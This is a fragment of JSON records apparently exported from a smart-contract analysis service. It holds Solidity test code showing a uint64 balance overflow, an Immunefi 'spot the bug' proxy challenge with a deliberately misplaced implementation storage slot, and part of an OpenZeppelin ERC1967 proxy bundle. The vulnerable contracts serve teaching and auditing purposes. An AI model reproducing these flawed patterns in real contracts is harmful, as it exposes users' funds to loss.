Test {\n    Invariant InvariantContract;\n\n    function testInvariant() public {\n        InvariantContract = new Invariant();\n        InvariantContract.receiveMoney{value: 1 ether}();\n        console.log(\n            \"BalanceReceived:\",\n            InvariantContract.balanceReceived(address(this))\n        );\n\n        InvariantContract.receiveMoney{value: 18 ether}();\n        console.log(\n            \"testInvariant, BalanceReceived:\",\n            InvariantContract.balanceReceived(address(this))\n        );\n        /*\nThat's only 553255926290448384 Wei, or around 0.553 Ether. Where is the rest? What happened?\n\nWe are storing the balance in an uint64. Unsigned integers go from 0 to 2^n-1, \nso that's 2^64-1 or 18446744073709551615. So, it can store a max of 18.4467... \nEther. We sent 19 Ether to the contract. \nIt automatically rolls over to 0. So, we end up with 19000000000000000000 - 18446744073709551615 -1 (the 0 value) = 553255926290448384.\n*/\n    }\n\n    receive() external payable {}\n}\n\ncontract Invariant {\n    mapping(address => uint64) public balanceReceived;\n\n    function receiveMoney() public payable {\n        balanceReceived[msg.sender] += uint64(msg.value);\n    }\n\n    function withdrawMoney(address payable _to, uint64 _amount) public {\n        require(\n            _amount <= balanceReceived[msg.sender],\n            \"Not Enough Funds, aborting\"\n        );\n\n        balanceReceived[msg.sender] -= _amount;\n        _to.transfer(_amount);\n    }\n}","contract_language":"solidity","status":"completed","created_at":"2025-08-29T08:17:13.513Z","completed_at":"2025-08-29T08:19:08.347Z","user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":null,"public_description":null,"tags":[],"credits_used":21,"code_complexity":3,"is_pinned":false,"is_archived":false},{"id":"4c8c5785-68b2-4cee-8491-be385bef2904","session_key":"67bd47c2-2bb4-46f2-8b87-27d0613d40df","contract_code":"// File: Immunefi_ch2.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/utils/Address.sol\";\nimport \"@openzeppelin/contracts/utils/StorageSlot.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/proxy/utils/Initializable.sol\";\n\n//#SpotTheBugChallenge\n//https://twitter.com/immunefi/status/1562858386244665348?s=21&t=d7_HtNra5AGuNmzVtv9uKg\ninterface imp {\n    function initialize(address) external;\n}\n\ncontract ContractTest is Test {\n    Proxy ProxyContract;\n    Implementation ImplementationContract;\n\n    function testChallenge() public {\n        ImplementationContract = new Implementation();\n        console.log(\n            \"ImplementationContract addr\",\n            address(ImplementationContract)\n        );\n        ProxyContract = new Proxy(address(ImplementationContract));\n\n        emit log_named_bytes32(\n            \"Storage slot 0:\",\n            vm.load(address(ProxyContract), bytes32(uint256(0)))\n        );\n    }\n}\n\ncontract Proxy {\n    //bytes32 constant internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\");  //correct pattern.\n    bytes32 internal _IMPLEMENTATION_SLOT = keccak256(\"where.bug.ser\"); // wrong\n\n    constructor(address implementation) {\n        _setImplementation(address(0));\n        Address.functionDelegateCall(\n            implementation,\n            abi.encodeWithSignature(\"initialize(address)\", msg.sender)\n        );\n    }\n\n    fallback() external payable {\n        address implementation = _getImplementation();\n        Address.functionDelegateCall(implementation, msg.data);\n    }\n\n    function _setImplementation(address newImplementation) private {\n        //require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n        StorageSlot\n            .getAddressSlot(_IMPLEMENTATION_SLOT)\n            .value = newImplementation;\n    }\n\n    function _getImplementation() public view returns (address) {\n        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\n    }\n}\n\ncontract Implementation is Ownable, Initializable {\n    // function initialize(address owner) external {    //test purpose\n    function initialize(address owner) external initializer {\n        _transferOwnership(owner);\n    }\n}\n","contract_language":"solidity","status":"completed","created_at":"2025-08-28T06:46:56.419Z","completed_at":"2025-08-28T06:49:31.199Z","user_id":"126b470c-625b-4074-913b-92b0edb9d452","contract_source":"manual","github_repo_id":null,"github_file_path":null,"is_public":true,"public_title":null,"public_description":null,"tags":[],"credits_used":0,"code_complexity":1,"is_pinned":false,"is_archived":false},{"id":"5cb32423-be69-4e5d-8cfd-3469e4d5979c","session_key":"ae5251c6-db55-41a0-a0e9-027b9a05b9bc","contract_code":"Analyze this verified smart contract project: ERC1967Proxy\n\nContract Address: 0xDD9BC35aE942eF0cFa76930954a156B3fF30a4E1\nNetwork: ethereum\nCompiler: v0.8.9+commit.e5eed63a\nFiles: 13 source files\n\n```solidity\n// File: contracts/import.sol\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"@openzeppelin/contracts/proxy/beacon/BeaconProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol\";\nimport \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\";\nimport \"@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\";\n\n// Kept for backwards compatibility with older versions of Hardhat and Truffle plugins.\ncontract AdminUpgradeabilityProxy is TransparentUpgradeableProxy {\n    constructor(address logic, address admin, bytes memory data) payable TransparentUpgradeableProxy(logic, admin, data) {}\n}\n\n\n// File: @openzeppelin/contracts/proxy/beacon/BeaconProxy.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./IBeacon.sol\";\nimport \"../Proxy.sol\";\nimport \"../ERC1967/ERC1967Upgrade.sol\";\n\n/**\n * @dev This contract implements a proxy that gets the implementation address for each call from a {UpgradeableBeacon}.\n *\n * The beacon address is stored in storage slot `uint256(keccak256('eip1967.proxy.beacon')) - 1`, so that it doesn't\n * conflict with the storage layout of the implementation behind the proxy.\n *\n * _Available since v3.4._\n */\ncontract BeaconProxy is Proxy, ERC1967Upgrade {\n    /**\n     * @dev Initializes the proxy with `beacon`.\n     *\n     * If `data` is nonempty, it's used as data in a delegate call to the implementation returned by the beacon. This\n     * will typically be an encoded function call, and allows initializating the storage of the proxy like a Solidity\n     * constructor.\n     *\n     * Requirements:\n     *\n     * - `beacon` must be a contract with the interface {IBeacon}.\n     */\n    constructor(address beacon, bytes memory data) payable {\n        assert(_BEACON_SLOT == bytes32(uint256(keccak256(\"eip1967.proxy.beacon\")) - 1));\n        _upgradeBeaconToAndCall(beacon, data, false);\n    }\n\n    /**\n     * @dev Returns the current beacon address.\n     */\n    function _beacon() internal view virtual returns (address) {\n        return _getBeacon();\n    }\n\n    /**\n     * @dev Returns the current implementation address of the associated beacon.\n     */\n    function _implementation() internal view virtual override returns (address) {\n        return IBeacon(_getBeacon()).implementation();\n    }\n\n    /**\n     * @dev Changes the proxy to use a new beacon. Deprecated: see {_upgradeBeaconToAndCall}.\n     *\n     * If `data` is nonempty, it's used as data in a delegate call to the implementation returned by the beacon.\n     *\n     * Requirements:\n     *\n     * - `beacon` must be a contract.\n     * - The implementation returned by `beacon` must be a contract.\n     */\n    function _setBeacon(address beacon, bytes memory data) internal virtual {\n        _upgradeBeaconToAndCall(beacon, data, false);\n    }\n}\n\n\n// File: @openzeppelin/contracts/proxy/beacon/UpgradeableBeacon.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./IBeacon.sol\";\nimport \"../../access/Ownable.sol\";\nimport \"../../utils/Address.sol\";\n\n/**\n * @dev This contract is used in conjunction with one or more instances of {BeaconProxy} to determine their\n * implementation contract, which is where they will delegate all function calls.\n *\n * An owner is able to change the implementation the beacon points to, thus upgrading the proxies that use this beacon.\n */\ncontract UpgradeableBeacon is IBeacon, Ownable {\n    address private _implementation;\n\n    /**\n     * @dev Emitted when the implementation returned by the beacon is changed.\n     */\n    event Upgraded(address indexed implementation);\n\n    /**\n     * @dev Sets the address of the initial implementation, and the deployer account as the owner who can upgrade the\n     * beacon.\n     */\n    constructor(address implementation_) {\n        _setImplementation(implementation_);\n    }\n\n    /**\n     * @dev Returns the current implementation address.\n     */\n    function implementation() public view virtual override returns (address) {\n        return _implementation;\n    }\n\n    /**\n     * @dev Upgrades the beacon to a new implementation.\n     *\n     * Emits an {Upgraded} event.\n     *\n     * Requirements:\n     *\n     * - msg.sender must be the owner of the contract.\n     * - `newImplementation` must be a contract.\n     */\n    function upgradeTo(address newImplementation) public virtual onlyOwner {\n        _setImplementation(newImplementation);\n        emit Upgraded(newImplementation);\n    }\n\n    /**\n     * @dev Sets the implementation contract address for this beacon\n     *\n     * Requirements:\n     *\n     * - `newImplementation` must be a contract.\n     */\n    function _setImplementation(address newImplementation) private {\n        require(Address.isContract(newImplementation), \"UpgradeableBeacon: implementation is not a contract\");\n        _implementation = newImplementation;\n    }\n}\n\n\n// File: @openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"../Proxy.sol\";\nimport \"./ERC1967Upgrade.sol\";\n\n/**\n * @dev This contract implements an upgradeable proxy. It is upgradeable because calls are delegated to an\n * implementation address that can be changed. This address is stored in storage in the location specified by\n * https://eips.ethereum.org/EIPS/eip-1967[EIP1967], so that it doesn't conflict with the storage layout of the\n * implementation behind the proxy.\n */\ncontract ERC1967Proxy is Proxy, ERC1967Upgrade {\n    /**\n     * @dev Initializes the upgradeable proxy with an initial implementation specified by `_logic`.\n     *\n     * If `_data` is nonempty, it's used as data in a delegate call to `_logic`. This will typically be an encoded\n     * function call, and allows initializating the storage of the proxy like a Solidity constructor.\n     */\n    constructor(address _logic, bytes memory _data) payable {\n        assert(_IMPLEMENTATION_SLOT == bytes32(uint256(keccak256(\"eip1967.proxy.implementation\")) - 1));\n        _upgradeToAndCall(_logic, _data, false);\n    }\n\n    /**\n     * @dev Returns the current implementation address.\n     */\n    function _implementation() internal view virtual override returns (address impl) {\n        return ERC1967Upgrade._getImplementation();\n    }\n}\n\n\n// File: @openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"../ERC1967/ERC1967Proxy.sol\";\n\n/**\n * @dev This contract implements a proxy that is upgradeable by an admin.\n *\n * To avoid https://medium.com/nomic-labs-blog/malicious-backdoors-in-ethereum-proxies-62629adf3357[proxy selector\n * clashing], which can potentially be used in an attack, this contract uses the\n * https://blog.openzeppelin.com/the-transparent-proxy-pattern/[transparent proxy pattern]. This pattern implies two\n * things that go hand in hand:\n *\n * 1. If any account other than the admin calls the proxy, the call will be forwarded to the implementation, even if\n * that call matches one of the admin functions exposed by the proxy itself.\n * 2. If the admin calls the proxy, it can access the admin functions, but its calls will never be forwarded to the\n * implementation. If the admin tries to call a function on the implementation it will fail with an error that says\n * \"admin cannot fallback to proxy target\".\n *\n * These properties mean that the admin account can only be used for admin actions like upgrading the proxy or changing\n * the admin, so it's best if it's a dedicated account that is not used for anything else. This will avoid headaches due\n * to sudden errors when trying to call a function from the proxy implementation.\n *\n * Our recommendation is for the dedicated account to be an instance of the {ProxyAdmin} contract. If set up this way,\n * you should think of the `ProxyAdmin` instance as the real administrative interface of your proxy.\n */\ncontract TransparentUpgradeableProxy is ERC1967Proxy {\n    /**\n     * @dev Initializes an upgradeable proxy managed by `_admin`, backed by the implementation at `_logic`, and\n     * optionally initialized with `_data` as explained in {ERC1967Proxy-constructor}.\n     */\n    constructor(address _logic, address admin_, bytes memory _data) payable ERC1967Proxy(_logic, _data) {\n        assert(_ADMIN_SLOT == bytes32(uint256(keccak256(\"eip1967.proxy.admin\")) - 1));\n        _changeAdmin(admin_);\n    }\n\n    /**\n     * @dev Modifier used internally that will delegate the call to the implementation unless the sender is the admin.\n     */\n    modifier ifAdmin() {\n        if (msg.sender == _getAdmin()) {\n            _;\n        } else {\n            _fallback();\n        }\n    }\n\n    /**\n     * @dev Returns the current admin.\n     *\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-getProxyAdmin}.\n     *\n     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the\n     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.\n     * `0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103`\n     */\n    function admin() external ifAdmin returns (address admin_) {\n        admin_ = _getAdmin();\n    }\n\n    /**\n     * @dev Returns the current implementation.\n     *\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-getProxyImplementation}.\n     *\n     * TIP: To get this value clients can read directly from the storage slot shown below (specified by EIP1967) using the\n     * https://eth.wiki/json-rpc/API#eth_getstorageat[`eth_getStorageAt`] RPC call.\n     * `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`\n     */\n    function implementation() external ifAdmin returns (address implementation_) {\n        implementation_ = _implementation();\n    }\n\n    /**\n     * @dev Changes the admin of the proxy.\n     *\n     * Emits an {AdminChanged} event.\n     *\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-changeProxyAdmin}.\n     */\n    function changeAdmin(address newAdmin) external virtual ifAdmin {\n        _changeAdmin(newAdmin);\n    }\n\n    /**\n     * @dev Upgrade the implementation of the proxy.\n     *\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-upgrade}.\n     */\n    function upgradeTo(address newImplementation) external ifAdmin {\n        _upgradeToAndCall(newImplementation, bytes(\"\"), false);\n    }\n\n    /**\n     * @dev Upgrade the implementation of the proxy, and then call a function from the new implementation as specified\n     * by `data`, which should be an encoded function call. This is useful to initialize new storage variables in the\n     * proxied contract.\n     *\n     * NOTE: Only the admin can call this function. See {ProxyAdmin-upgradeAndCall}.\n     */\n    function upgradeToAndCall(address newImplementation, bytes calldata data) external payable ifAdmin {\n        _upgradeToAndCall(newImplementation, data, true);\n    }\n\n    /**\n     * @dev Returns the current admin.\n     */\n    function _admin() internal view virtual returns (address) {\n        return _getAdmin();\n    }\n\n    /**\n     * @dev Makes sure the admin cannot access the fallback function. See {Proxy-_beforeFallback}.\n     */\n    function _beforeFallback() internal virtual override {\n        require(msg.sender != _getAdmin(), \"TransparentUpgradeableProxy: admin cannot fallback to proxy target\");\n        super._beforeFallback();\n    }\n}\n\n\n// File: @openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport \"./TransparentUpgradeableProxy.sol\";\nimport \"../../access/Ownable.sol\";\n\n/**\n * @dev This is an auxiliary contract meant to be assigned as the admin of a {TransparentUpgradeableProxy}. For an\n * explanation of why you would want to use this see the documentation for {TransparentUpgradeableProxy}.\n */\ncontract ProxyAdmin is Ownable {\n\n    /**\n     * @dev Returns the current implementation of `proxy`.\n     *\n     * Requirements:\n     *\n     * - This contract must be the admin of `proxy`.\n     */\n    function getProxyImplementation(TransparentUpgradeableProxy proxy) public view virtual returns (address) {\n        // We need to manually run the static call since the getter cannot be flagged as view\n        // bytes4(keccak256(\"implementation()\")) == 0x5c60da1b\n        (bool success, bytes memory returndata) = address(proxy).staticcall(hex\"5c60da1b\");\n        require(success);\n        return abi.decode(returndata, (address));\n    }\n\n    /**\n     * @dev Returns the current admin of `proxy`.\n     *\n     * Requirements:\n     *\n     * - This contract must be the admin of `proxy`.\n     */\n    function getProxyAdmin(TransparentUpgradeableProxy proxy) public view virtual returns (address) {\n        // We need to manually run the static call since the getter cannot be flagged as view\n        // bytes4(keccak256(\"admin()\")) == 0xf851a440\n        (bool success, bytes memory returndata) = address(proxy).staticcall(hex\"f851a440\");\n        require(success);\n        return abi.decode(returndata, (address));\n    }\n\n    /**\n     * @dev Changes the admin of `proxy` to `newAdmin`.\n     *\n     * Requirements:\n     *\n     * - This contract must be the current admin of `proxy`.\n     */\n    function changeProxyAdmin(TransparentUpgradeableProxy proxy, address newAdmin) public virtual onlyOwner {\n        proxy.changeAdmin(newAdmin);\n    }\n\n    /**\n     * @dev Upgrades `proxy` to `implementation`. See {TransparentUpgradeableProxy-upgradeTo}.\n     *\n     * Requirements:\n     *\n     * - This contract must be the admin of `proxy`.\n     */\n    function upgrade(TransparentUpgradeableProxy proxy, address implementation) public virtual onlyOwner {\n        proxy.upgradeTo(implementation);\n    }\n\n    /**\n     * @dev Upgrades `proxy` to `implementation` and calls a function on the new implementation. See\n     * {TransparentUpgradeableProxy-upgradeToAndCall}.\n     *\n     * Requirements:\n     *\n     * - This contract must be the admin of `proxy`.\n     */\n    function upgradeAndCall(TransparentUpgradeableProxy proxy, address implementation, bytes memory data) public payable virtual onlyOwner {\n        proxy.upgradeToAndCall{value: msg.value}(implementation, data);\n    }\n}\n\n\n// File: @openzeppelin/contracts/proxy/beacon/IBeacon.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @dev This is the interface that {BeaconProxy} expects of its beacon.\n */\ninterface IBeacon {\n    /**\n     * @dev Must return an address that can be used as a delegate call target.\n     *\n     * {BeaconProxy} will check that this address is a contract.\n     */\n    function implementation() external view returns (address);\n}\n\n\n// File: @openzeppelin/contracts/proxy/Proxy.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @dev This abstract contract provides a fallback function that delegates all calls to another contract using the EVM\n * instruction `delegatecall`. We refer to the second contract as the _implementation_ behind the proxy, and it has to\n * be specified by overriding the virtual {_implementation} function.\n *\n * Additionally, delegation to the implementation can be triggered manually through the {_fallback} function, or to a\n * different contract through the {_delegate} function.\n *\n * The success and return data of the delegated call will be returned back to the caller of the proxy.\n */\nabstract contract Proxy {\n    /**\n     * @dev Delegates the current call to `implementation`.\n     *\n     * This function does not return to its internall call site, it will return directly to the external caller.\n     */\n    function _delegate(address implementation) internal virtual {\n        // solhint-disable-next-line no-inline-assembly\n        assembly {\n            // Copy msg.data. We take full control of memory in this inline assembly\n            // block because it will not return to Solidity code. We overwrite the\n            // Solidity scratch pad at memory position 0.\n            calldatacopy(0, 0, calldatasize())\n\n            // Call the implementation.\n            // out and outsize are 0 because we don't know the size yet.\n            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)\n\n            // Copy the returned data.\n            returndatacopy(0, 0, returndatasize())\n\n            switch result\n            // delegatecall returns 0 on error.\n            case 0 { revert(0, returndatasize()) }\n            default { return(0, returndatasize()) }\n        }\n    }\n\n    /**\n     * @dev This is a virtual function that should be overriden so it returns the address to which the fallback function\n     * and {_fallback} should delegate.\n     */\n    function _implementation() internal view virtual returns (address);\n\n    /**\n     * @dev Delegates the current call to the address returned by `_implementation()`.\n     *\n     * This function does not return to its internall call site, it will return directly to the external caller.\n     */\n    function _fallback() internal virtual {\n        _beforeFallback();\n        _delegate(_implementation());\n    }\n\n    /**\n     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if no other\n     * function in the contract matches the call data.\n     */\n    fallback () external payable virtual {\n        _fallback();\n    }\n\n    /**\n     * @dev Fallback function that delegates calls to the address returned by `_implementation()`. Will run if call data\n     * is empty.\n     */\n    receive () external payable virtual {\n        _fallback();\n    }\n\n    /**\n     * @dev Hook that is called before falling back to the implementation. Can happen as part of a manual `_fallback`\n     * call, or as part of the Solidity `fallback` or `receive` functions.\n     *\n     * If overriden should call `super._beforeFallback()`.\n     */\n    function _beforeFallback() internal virtual {\n    }\n}\n\n\n// File: @openzeppelin/contracts/proxy/ERC1967/ERC1967Upgrade.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\nimport \"../beacon/IBeacon.sol\";\nimport \"../../utils/Address.sol\";\nimport \"../../utils/StorageSlot.sol\";\n\n/**\n * @dev This abstract contract provides getters and event emitting update functions for\n * https://eips.ethereum.org/EIPS/eip-1967[EIP1967] slots.\n *\n * _Available since v4.1._\n *\n * @custom:oz-upgrades-unsafe-allow delegatecall\n */\nabstract contract ERC1967Upgrade {\n    // This is the keccak-256 hash of \"eip1967.proxy.rollback\" subtracted by 1\n    bytes32 private constant _ROLLBACK_SLOT = 0x4910fdfa16fed3260ed0e7147f7cc6da11a60208b5b9406d12a635614ffd9143;\n\n    /**\n     * @dev Storage slot with the address of the current implementation.\n     * This is the keccak-256 hash of \"eip1967.proxy.implementation\" subtracted by 1, and is\n     * validated in the constructor.\n     */\n    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\n    /**\n     * @dev Emitted when the implementation is upgraded.\n     */\n    event Upgraded(address indexed implementation);\n\n    /**\n     * @dev Returns the current implementation address.\n     */\n    function _getImplementation() internal view returns (address) {\n        return StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value;\n    }\n\n    /**\n     * @dev Stores a new address in the EIP1967 implementation slot.\n     */\n    function _setImplementation(address newImplementation) private {\n        require(Address.isContract(newImplementation), \"ERC1967: new implementation is not a contract\");\n        StorageSlot.getAddressSlot(_IMPLEMENTATION_SLOT).value = newImplementation;\n    }\n\n    /**\n     * @dev Perform implementation upgrade\n     *\n     * Emits an {Upgraded} event.\n     */\n    function _upgradeTo(address newImplementation) internal {\n        _setImplementation(newImplementation);\n        emit Upgraded(newImplementation);\n    }\n\n    /**\n     * @dev Perform implementation upgrade with additional setup call.\n     *\n     * Emits an {Upgraded} event.\n     */\n    function _upgradeToAndCall(address newImplementation, bytes memory data, bool forceCall) internal {\n        _setImplementation(newImplementation);\n        emit Upgraded(newImplementation);\n        if (data.length > 0 || forceCall) {\n            Address.functionDelegateCall(newImplementation, data);\n        }\n    }\n\n    /**\n     * @dev Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.\n     *\n     * Emits an {Upgraded} event.\n     */\n    function _upgradeToAndCallSecure(address newImplementation, bytes memory data, bool forceCall) internal {\n        address oldImplementation = _getImplementation();\n\n        // Initial upgrade and setup call\n        _setImplementation(newImplementation);\n        if (data.length > 0 || forceCall) {\n            Address.functionDelegateCall(newImplementation, data);\n        }\n\n        // Perform rollback test if not already in progress\n        StorageSlot.BooleanSlot storage rollbackTesting = StorageSlot.getBooleanSlot(_ROLLBACK_SLOT);\n        if (!rollbackTesting.value) {\n            // Trigger rollback using upgradeTo from the new implementation\n            rollbackTesting.value = true;\n            Address.functionDelegateCall(\n                newImplementation,\n                abi.encodeWithSignature(\n                    \"upgradeTo(address)\",\n                    oldImplementation\n                )\n            );\n            rollbackTesting.value = false;\n            // Check rollback was effective\n            require(oldImplementation == _getImplementation(), \"ERC1967Upgrade: upgrade breaks further upgrades\");\n            // Finally reset to the new implementation and log the upgrade\n            _setImplementation(newImplementation);\n            emit Upgraded(newImplementation);\n        }\n    }\n\n    /**\n     * @dev Perform beacon upgrade with additional setup call. Note: This upgrades the address of the beacon, it does\n     * not upgrade the implementation contained in the beacon (see {UpgradeableBeacon-_setImplementation} for that).\n     *\n     * Emits a {BeaconUpgraded} event.\n     */\n    function _upgradeBeaconToAndCall(address newBeacon, bytes memory data, bool forceCall) internal {\n        _setBeacon(newBeacon);\n        emit BeaconUpgraded(newBeacon);\n        if (data.length > 0 || forceCall) {\n            Address.functionDelegateCall(IBeacon(newBeacon).implementation(), data);\n        }\n    }\n\n    /**\n     * @dev Storage slot with the admin of the contract.\n     * This is the keccak-256 hash of \"eip1967.proxy.admin\" subtracted by 1, and is\n     * validated in the constructor.\n     */\n    bytes32 internal constant _ADMIN_SLOT = 0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103;\n\n    /**\n     * @dev Emitted when the admin account has changed.\n     */\n    event AdminChanged(address previousAdmin, address newAdmin);\n\n    /**\n     * @dev Returns the current admin.\n     */\n    function _getAdmin() internal view returns (address) {\n        return StorageSlot.getAddressSlot(_ADMIN_SLOT).value;\n    }\n\n    /**\n     * @dev Stores a new address in the EIP1967 admin slot.\n     */\n    function _setAdmin(address newAdmin) private {\n        require(newAdmin != address(0), \"ERC1967: new admin is the zero address\");\n        StorageSlot.getAddressSlot(_ADMIN_SLOT).value = newAdmin;\n    }\n\n    /**\n     * @dev Changes the admin of the proxy.\n     *\n     * Emits an {AdminChanged} event.\n     */\n    function _changeAdmin(address newAdmin) internal {\n        emit AdminChanged(_getAdmin(), newAdmin);\n        _setAdmin(newAdmin);\n    }\n\n    /**\n     * @dev The storage slot of the UpgradeableBeacon contract which defines the implementation for this proxy.\n     * This is bytes32(uint256(keccak256('eip1967.proxy.beacon')) - 1)) and is validated in the constructor.\n     */\n    bytes32 internal constant _BEACON_SLOT = 0xa3f0ad74e5423aebfd80d3ef4346578335a9a72aeaee59ff6cb3582b35133d50;\n\n    /**\n     * @dev Emitted when the beacon is upgraded.\n     */\n    event BeaconUpgraded(address indexed beacon);\n\n    /**\n     * @dev Returns the current beacon.\n     */\n    function _getBeacon() internal view returns (address) {\n        return StorageSlot.getAddressSlot(_BEACON_SLOT).value;\n    }\n\n    /**\n     * @dev Stores a new beacon in the EIP1967 beacon slot.\n     */\n    function _setBeacon(address newBeacon) private {\n        require(\n            Address.isContract(newBeacon),\n            \"ERC1967: new beacon is not a contract\"\n        );\n        require(\n            Address.isContract(IBeacon(newBeacon).implementation()),\n            \"ERC1967: beacon implementation is not a contract\"\n        );\n        StorageSlot.getAddressSlot(_BEACON_SLOT).value = newBeacon;\n    }\n}\n\n\n// File: @openzeppelin/contracts/utils/Address.sol\n// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\n/**\n * @dev Collection of functions related to the address type\n */\nlibrary Address {\n    /**\n     * @dev Returns true if `account` is a contract.\n     *\n     * [IMPORTANT]\n     * ====\n     * It is unsafe to assume that an address for which this function returns\n     * false is an externally-owned account (EOA) and not a contract.\n     *\n     * Among others, `isContract` will return false for the following\n     * types of addresses:\n     *\n     *  - an externally-owned account\n     *  - a contract in construction\n     *  - an address where a contract will be created\n     *  - an address where a contract lived, but was destroyed\n     * ====\n     */\n    function isContract(address account) internal view returns (bool) {\n        // This method relies on extcodesize, which returns 0 for contracts in\n        // construction, since the code is only stored at the end of the\n        // constructor execution.\n\n        uint256 size;\n        // solhint-disable-next-line no-inline-assembly\n        assembly { size := extcodesize(account) }\n        return size > 0;\n    }\n\n    /**\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\n     * `recipient`, forwarding all available gas and reverting on errors.\n     *\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\n     * imposed by `transfer`, making them unable to receive funds via\n     * `transfer`. {sendValue} removes this limitation.\n     *\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\n     *\n     * IMPORTANT: because control is transferred to `recipient`, care must be\n     * taken to not create reentrancy vulnerabilities. Consider using\n     * {ReentrancyGuard} or the\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\n     */\n    function sendValue(address payable recipient, uint256 amount) internal {\n        require(address(this).balance >= amount, \"Address: insufficient balance\");\n\n        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value\n        (bool success, ) = recipient.call{ value: amount }(\"\");\n        require(success, \"Address: unable to send value, recipient may have reverted\");\n    }\n\n    /**\n     * @dev Performs a Solidity function call using a low level `call`. A\n     * plain`call` is an unsafe replacement for a function call: use this\n     * function instead.\n     *\n     * If `target` reverts with a revert reason, it is bubbled up by this\n     * function (like regular Solidity function calls).\n     *\n     * Returns the raw returned data. To convert to the expected return value,\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\n     *\n     * Requirements:\n     *\n     * - `target` must be a contract.\n     * - calling `target` with `data` must not revert.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\n      return functionCall(target, data, \"Address: low-level call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\n     * `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, 0, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but also transferring `value` wei to `target`.\n     *\n     * Requirements:\n     *\n     * - the calling contract must have an ETH balance of at least `value`.\n     * - the called Solidity function must be `payable`.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {\n        return functionCallWithValue(target, data, value, \"Address: low-level call with value failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\n     *\n     * _Available since v3.1._\n     */\n    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {\n        require(address(this).balance >= value, \"Address: insufficient balance for call\");\n        require(isContract(target), \"Address: call to non-contract\");\n\n        // solhint-disable-next-line avoid-low-level-calls\n        (bool success, bytes memory returndata) = target.call{ value: value }(data);\n        return _verifyCallResult(success, returndata, errorMessage);\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\n        return functionStaticCall(target, data, \"Address: low-level static call failed\");\n    }\n\n    /**\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\n     * but performing a static call.\n     *\n     * _Available since v3.3._\n     */\n    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {\n        require(isContract(target), \"Address: static call to non-contract\");\n\n        // solhint-disable-next-line 